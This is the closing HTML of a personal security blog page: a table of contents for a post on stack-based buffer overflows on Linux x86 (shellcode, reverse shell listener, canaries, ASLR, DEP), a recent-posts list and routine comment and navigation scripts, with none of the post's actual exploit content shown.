class="toc-text">MSFvenom Syntax</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSFvenom-Generate-Shellcode"><span class="toc-number">3.4.0.2.</span> <span class="toc-text">MSFvenom - Generate Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode"><span class="toc-number">3.4.0.3.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Notes-3"><span class="toc-number">3.4.0.4.</span> <span class="toc-text">Notes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-with-Shellcode"><span class="toc-number">3.4.0.5.</span> <span class="toc-text">Exploit with Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Stack-4"><span class="toc-number">3.4.0.6.</span> <span class="toc-text">The Stack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Identification-of-the-Return-Address"><span class="toc-number">3.5.</span> <span class="toc-text">Identification of the Return Address</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-NOPS"><span class="toc-number">3.5.0.1.</span> <span class="toc-text">GDB NOPS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buffer-%E7%BC%93%E5%86%B2-1"><span class="toc-number">3.5.0.2.</span> <span class="toc-text">Buffer 缓冲</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Notes-4"><span class="toc-number">3.5.0.3.</span> <span class="toc-text">Notes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Reverse-Shell-Listener"><span class="toc-number">3.5.0.4.</span> <span class="toc-text">Netcat - Reverse Shell Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.5.0.5.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Reverse-Shell-Listener-1"><span class="toc-number">3.5.0.6.</span> <span class="toc-text">Netcat - Reverse Shell Listener</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Proof-Of-Concept"><span class="toc-number">4.</span> <span class="toc-text">Proof-Of-Concept</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Public-Exploit-Modification"><span class="toc-number">4.1.</span> <span class="toc-text">Public Exploit Modification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention-Techniques-and-Mechanisms"><span class="toc-number">4.2.</span> <span class="toc-text">Prevention Techniques and Mechanisms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canaries"><span class="toc-number">4.3.</span> <span class="toc-text">Canaries</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80%E9%9A%8F%E6%9C%BA%E5%8C%96%EF%BC%88ASLR%EF%BC%89"><span class="toc-number">4.4.</span> <span class="toc-text">地址空间布局随机化（ASLR）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Data-Execution-Prevention-DEP"><span class="toc-number">4.5.</span> <span class="toc-text">Data Execution Prevention (DEP)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Skills-Assessment"><span class="toc-number">5.</span> <span class="toc-text">Skills Assessment</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2023/11/11/Stack-BasedBufferOverflowsonLinuxx86HTB/'
+    this.page.identifier = '/2023/11/11/Stack-BasedBufferOverflowsonLinuxx86HTB/'
+    this.page.title = 'Stack-BasedBufferOverflowsonLinuxx86HTB'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
